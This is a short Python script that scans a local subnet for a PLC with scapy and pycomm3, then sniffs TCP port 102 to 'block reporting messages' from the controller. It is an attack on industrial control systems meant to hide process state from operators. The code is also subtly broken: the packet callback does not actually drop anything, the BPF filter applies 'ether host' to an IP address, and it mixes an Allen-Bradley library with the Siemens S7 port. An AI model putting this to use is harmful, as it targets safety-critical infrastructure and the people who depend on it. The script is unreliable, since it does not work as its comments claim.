import pycomm3
from pycomm3 import LogixDriver
from scapy.all import *
import socket
import time

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same subnet as the Windows machine
    # and the subnet mask is 255.255.255.0
    ip_range = "192.168.1.0/24"
    plc_ip = None

    # Send ARP requests to all IP addresses in the subnet
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2, verbose=False)

    for sent, received in ans:
        # Check if the received IP is the PLC
        try:
            with pycomm3.CipDriver(received.psrc) as plc:
                if plc.open():
                    plc_ip = received.psrc
                    break
        except Exception as e:
            print(f"Error connecting to {received.psrc}: {e}")

    return plc_ip

# Function to block reporting messages
def block_reporting_messages(plc_ip):
    # Define the reporting message filter
    reporting_message_filter = "ether host " + plc_ip + " and tcp port 102"

    # Start sniffing for reporting messages
    def packet_callback(packet):
        if packet.haslayer(TCP) and packet[TCP].dport == 102:
            print(f"Blocking reporting message from {packet[IP].src} to {packet[IP].dst}")
            # Drop the packet
            return

    # Start the packet sniffer
    sniff(filter=reporting_message_filter, prn=packet_callback, store=0)

# Main function
def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        # Block reporting messages
        block_reporting_messages(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()